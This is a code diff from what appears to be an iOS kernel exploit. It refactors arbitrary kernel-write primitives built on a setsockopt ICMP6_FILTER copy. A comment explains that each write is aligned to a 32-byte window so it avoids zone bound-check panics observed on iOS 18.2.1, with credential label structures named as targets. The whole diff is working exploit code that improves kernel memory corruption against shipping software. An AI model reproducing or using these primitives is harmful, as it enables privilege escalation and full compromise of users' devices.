@@ -432,28 +432,36 @@ void kread_buf(uint64_t where, void *buf, size_t size) {
     if (size) early_kread(where, b, size);
 }
 
-void kwrite64(uint64_t where, uint64_t val) {
-    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
-    *(uint64_t*)buf = val; set_kaddr(where);
+// Our write primitive is a 32-byte setsockopt(ICMP6_FILTER) copy at an arbitrary
+// address. Writing at an offset near the end of a small zone element (e.g. the
+// 32-byte MAC Labels element that holds cr_label) overflows it -> "zone bound
+// checks: buffer of length 32 overflows object of size 32" @zalloc.c:1297
+// (observed repeatedly on iOS 18.2.1). Every kwrite therefore aligns the target
+// down to a 32-byte window and does a read-modify-write, so the 32-byte copy
+// starts exactly at the element boundary and can never overflow it.
+static void kwrite_aligned(uint64_t where, const void *data, size_t size) {
+    uint64_t base = where & ~0x1FULL;
+    uint8_t buf[0x20];
+    early_kread(base, buf, 0x20);
+    memcpy(buf + (where - base), data, size);
+    set_kaddr(base);
     setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
+}
+
+void kwrite64(uint64_t where, uint64_t val) {
+    kwrite_aligned(where, &val, 8);
 }
 
 void kwrite32(uint64_t where, uint32_t val) {
-    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
-    *(uint32_t*)buf = val; set_kaddr(where);
-    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
+    kwrite_aligned(where, &val, 4);
 }
 
 void kwrite16(uint64_t where, uint16_t val) {
-    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
-    *(uint16_t*)buf = val; set_kaddr(where);
-    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
+    kwrite_aligned(where, &val, 2);
 }
 
 void kwrite8(uint64_t where, uint8_t val) {
-    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
-    *(uint8_t*)buf = val; set_kaddr(where);
-    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
+    kwrite_aligned(where, &val, 1);
 }
 
 void kwrite_buf(uint64_t where, void *buf, size_t size) {
@@ -463,11 +471,7 @@ void kwrite_buf(uint64_t where, void *buf, size_t size) {
         where += 8; b += 8; size -= 8;
     }
     if (size) {
-        uint8_t tmp[0x20];
-        early_kread(where, tmp, 0x20);
-        memcpy(tmp, b, size);
-        set_kaddr(where);
-        setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, 0x20);
+        kwrite_aligned(where, b, size);
     }
 }
 
